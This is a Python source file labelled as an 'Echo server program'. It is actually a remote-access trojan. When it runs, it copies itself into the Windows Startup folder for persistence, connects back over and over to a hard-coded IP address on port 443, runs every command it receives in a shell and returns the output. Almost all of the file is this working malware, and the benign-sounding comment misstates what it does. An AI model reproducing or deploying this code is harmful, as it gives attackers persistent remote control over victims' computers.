# Echo server program
import socket
import subprocess
import time
import os


class Trojan:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        self.autorun()


    def autorun(self):
        try:
            filename = os.path.basename(__file__).replace(".py", ".exe")
            os.system(f"copy {filename} \"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\")
        except Exception as e:
            print(e)

    def connect(self):
        while True:
            try:
                con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                con.connect((self.ip, self.port))
                self.listen(con)
            except Exception as e:
                time.sleep(2)


    def execute(self, con):
        data = self.command(con)
        response = self.execute_command(data)
        self.print_message(con, response)

    def listen(self, con):
        while True:
            self.execute(con)




    def command(self,  con):
        return con.recv(1024).decode().strip()

    def execute_command(self, command):
        if command != "/exit":
            proc = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            return proc.stdout.read()
        elif command == "/spaw":
            shell = "python -c 'import pty; pty.spawn(\"/bin/sh\")'"
            proc = subprocess.Popen(shell, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
            return proc.stdout.read()
        else:
            return "Waiting..."


    def print_message(self, con, message):
        con.sendall(message)


if __name__ == "__main__":
    trojan = Trojan("192.168.2.101", 443)
    trojan.connect()



